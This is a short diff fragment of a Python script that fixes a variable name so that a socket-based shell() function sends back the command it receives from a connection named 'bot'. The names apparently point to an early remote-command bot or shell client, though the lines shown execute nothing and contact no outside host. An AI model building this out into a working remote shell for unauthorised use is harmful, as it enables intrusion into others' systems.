@@ -13,7 +13,7 @@ def init():
     
 def shell():
     command = bot.recv(1024)
-    bot.send(message.encode('utf-8'))
+    bot.send(command.encode('utf-8'))
 
 init()
 shell()
